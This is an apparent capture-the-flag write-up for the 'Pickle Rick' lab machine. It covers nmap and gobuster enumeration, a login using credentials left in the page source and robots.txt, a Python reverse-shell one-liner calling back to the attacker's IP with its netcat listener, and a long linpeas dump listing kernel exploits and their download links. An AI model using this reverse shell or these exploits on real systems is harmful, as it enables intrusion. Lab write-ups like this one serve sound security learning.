# Pickle Rick

2021-12-26

## Nmap

```
$ nmap -sV -sC -oN scan.nmap 10.10.30.160                                         
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-26 11:19 CST                                                     
Nmap scan report for 10.10.30.160                                                                                   
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:5b:a9:0b:2d:9e:1c:76:eb:22:ef:23:a1:d2:1e:cc (RSA)
|   256 c8:65:d1:6a:56:0d:47:72:13:89:de:2a:44:8f:93:48 (ECDSA)
|_  256 66:79:17:82:78:db:84:7d:3c:03:39:56:6c:c6:a8:bf (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.15 seconds
```

## Source HTML:

```
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

`/robots.txt`

```
Wubbalubbadubdub
```

## Gobuster

```
$ gobuster dir --url http://10.10.30.160 -w /usr/share/wordlists/dirb/common.txt 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.30.160
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/26 11:21:46 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/assets               (Status: 301) [Size: 313] [--> http://10.10.30.160/assets/]
/index.html           (Status: 200) [Size: 1062]                                 
/robots.txt           (Status: 200) [Size: 17]                                   
/server-status        (Status: 403) [Size: 300]                                  
                                                                                 
===============================================================
2021/12/26 11:22:39 Finished
===============================================================
```

```
$ gobuster dir -u http://10.10.30.160 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.30.160
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,sh,txt,cgi,html,js,css,py
[+] Timeout:                 10s
===============================================================
2021/12/26 12:08:46 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882] 
```

Log in to `/login.php` with `R1ckRul3s`/`Wubbalubbadubdub`

Execute `ls` to see 

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Execute `grep . Sup3rS3cretPickl3Ingred.txt` >> First Ingredent
Execute `grep . /home/rick/second\ ingredients` >> Second Ingredent

## Reverse Shell

From [Pentest Monkey Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Python:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.21.118",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

On attacking machine:

```
nc -lvnp 9999
```

Set up python3 http server to upload linpeas.sh, then run on Rick's box:

```

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 4.4.0-1072-aws (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: ip-10-10-30-160
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.4.0-1072-aws (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.5 LTS
Release:        16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.16


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Sun Dec 26 18:51:48 UTC 2021
 18:51:48 up  1:33,  0 users,  load average: 0.18, 0.05, 0.01

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
OLDPWD=/var/www/html
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

Available information:

Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

78 kernel space exploits
48 user space exploits

Possible Exploits:

[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL:
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 4.4.0
  Searching 72 exploits...

  Possible Exploits
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
                                             ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
                          ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root         1  0.1  0.5  37932  5988 ?        Ss   17:17   0:09 /sbin/init
root       404  0.0  0.2  28352  2732 ?        Ss   17:18   0:03 /lib/systemd/systemd-journald
root       437  0.0  0.1  94772  1564 ?        Ss   17:18   0:00 /sbin/lvmetad -f
root       467  0.0  0.3  42500  3876 ?        Ss   17:18   0:00 /lib/systemd/systemd-udevd
systemd+   663  0.0  0.2 100324  2556 ?        Ssl  17:18   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       971  0.0  0.2  16120  2892 ?        Ss   17:18   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root      1140  0.0  0.0   5220   152 ?        Ss   17:18   0:00 /sbin/iscsid
root      1141  0.0  0.3   5720  3524 ?        S<Ls 17:18   0:00 /sbin/iscsid
syslog    1146  0.0  0.3 260628  3456 ?        Ssl  17:18   0:00 /usr/sbin/rsyslogd -n
root      1151  0.0  0.2  27728  3024 ?        Ss   17:18   0:00 /usr/sbin/cron -f
message+  1154  0.0  0.3  42896  3956 ?        Ss   17:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
daemon[0m    1162  0.0  0.2  26044  2204 ?        Ss   17:18   0:00 /usr/sbin/atd -f
root      1163  0.0  1.3 272224 13192 ?        Ssl  17:18   0:04 /snap/amazon-ssm-agent/930/amazon-ssm-agent
root      1164  0.0  0.6 274488  6300 ?        Ssl  17:18   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root      1173  0.0  0.1   4396  1260 ?        Ss   17:18   0:00 /usr/sbin/acpid
root      1192  0.0  0.3 613444  3716 ?        Ssl  17:18   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root      1205  0.0  0.1  20096  1212 ?        Ss   17:18   0:00 /lib/systemd/systemd-logind
root      1207  0.0  2.6 224976 26732 ?        Ssl  17:18   0:05 /usr/lib/snapd/snapd
root      1215  0.0  0.5  65512  6064 ?        Ss   17:18   0:00 /usr/sbin/sshd -D
root      1250  0.0  0.0  13372   160 ?        Ss   17:19   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root      1251  0.0  0.8 277180  8128 ?        Ssl  17:19   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1309  0.0  0.2  14472  2228 ttyS0    Ss+  17:19   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1312  0.0  0.1  14656  1776 tty1     Ss+  17:19   0:00 /sbin/agetty --noclear tty1 linux
root      1342  0.0  3.1 361208 32356 ?        Ss   17:19   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data  1355  0.0  0.7 361208  8100 ?        S    17:19   0:00  _ php-fpm: pool www
www-data  1356  0.0  0.7 361208  8100 ?        S    17:19   0:00  _ php-fpm: pool www
root      1349  0.0  3.2 401916 32884 ?        Ss   17:19   0:00 /usr/sbin/apache2 -k start
www-data  1530  0.0  1.4 402376 14660 ?        S    17:24   0:02  _ /usr/sbin/apache2 -k start
www-data  1673  0.0  1.5 402384 15380 ?        S    17:56   0:01  _ /usr/sbin/apache2 -k start
www-data  1936  0.0  0.0   4504   848 ?        S    18:48   0:00  |           _ /bin/sh -i
www-data  1939  0.0  0.5  37720  5296 ?        S    18:48   0:00  |               _ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
www-data  1677  0.0  1.5 402376 15640 ?        S    18:08   0:01  _ /usr/sbin/apache2 -k start
www-data  1679  0.0  1.4 402376 14604 ?        S    18:08   0:01  _ /usr/sbin/apache2 -k start
www-data  1681  0.0  1.4 402392 14788 ?        S    18:08   0:01  _ /usr/sbin/apache2 -k start
www-data  1682  0.0  1.4 402384 14696 ?        S    18:08   0:01  _ /usr/sbin/apache2 -k start
www-data  1683  0.0  1.4 402400 14732 ?        S    18:08   0:01  _ /usr/sbin/apache2 -k start
www-data  1739  0.0  1.4 402376 14716 ?        S    18:09   0:01  _ /usr/sbin/apache2 -k start
www-data  1775  0.0  1.4 402384 14688 ?        S    18:13   0:01  _ /usr/sbin/apache2 -k start
www-data  1944  0.0  0.0   4504   692 ?        S    18:49   0:00  |           _ /bin/sh -i
www-data  1950  0.2  0.2   5380  2564 ?        S    18:51   0:00  |               _ /bin/sh ./linpeas.sh
www-data  5935  0.0  0.0   5380   968 ?        S    18:51   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  5939  0.0  0.2  34556  2992 ?        R    18:51   0:00  |                   |   _ ps fauxwww
www-data  5938  0.0  0.0   5380   968 ?        S    18:51   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  1776  0.0  1.4 402400 14724 ?        S    18:13   0:01  _ /usr/sbin/apache2 -k start
www-data  1777  0.0  1.4 402400 14724 ?        S    18:13   0:01  _ /usr/sbin/apache2 -k start
www-data  1778  0.0  1.4 402376 14608 ?        S    18:15   0:00  _ /usr/sbin/apache2 -k start
www-data  1779  0.0  1.4 402392 14848 ?        S    18:16   0:01  _ /usr/sbin/apache2 -k start
www-data  1807  0.0  1.4 402400 14736 ?        S    18:26   0:00  _ /usr/sbin/apache2 -k start
www-data  1816  0.0  1.4 402384 14688 ?        S    18:28   0:00  _ /usr/sbin/apache2 -k start
www-data  1910  0.0  1.1 402176 11196 ?        S    18:43   0:00  _ /usr/sbin/apache2 -k start
www-data  1911  0.0  1.4 402392 14624 ?        S    18:44   0:00  _ /usr/sbin/apache2 -k start
www-data  1913  0.0  0.9 401996  9468 ?        S    18:44   0:00  _ /usr/sbin/apache2 -k start
www-data  1914  0.0  1.1 402184 11288 ?        S    18:44   0:00  _ /usr/sbin/apache2 -k start
www-data  1915  0.0  1.1 402176 11192 ?        S    18:44   0:00  _ /usr/sbin/apache2 -k start
www-data  1916  0.0  1.4 402376 14596 ?        S    18:45   0:00  _ /usr/sbin/apache2 -k start

╔══════════╣ Binary processes permissions (non 'root root' and not beloging to current user)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Feb 10  2019 .
drwxr-xr-x 94 root root 4096 Dec 26 17:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Jun 22  2017 php
-rw-r--r--  1 root root  190 Nov 14  2018 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Feb 10  2019 .
drwxr-xr-x 94 root root 4096 Dec 26 17:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Jun 11  2018 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov 14  2018 .
drwxr-xr-x 94 root root 4096 Dec 26 17:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Nov 14  2018 .
drwxr-xr-x 94 root root 4096 Dec 26 17:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Nov 14  2018 .
drwxr-xr-x 94 root root 4096 Dec 26 17:18 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Mon 2021-12-27 03:06:13 UTC  8h left  Sun 2021-12-26 17:18:58 UTC  1h 32min ago apt-daily.timer              apt-daily.service
Mon 2021-12-27 06:36:21 UTC  11h left Sun 2021-12-26 17:18:58 UTC  1h 32min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2021-12-27 17:32:54 UTC  22h left Sun 2021-12-26 17:32:54 UTC  1h 18min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a      n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a      n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/5742/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/5742/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/5742/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/5742/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/5742/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/5742/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/5742/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/5742/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/5742/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/5742/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/6350/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/6350/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/6350/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/php/php7.0-fpm.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
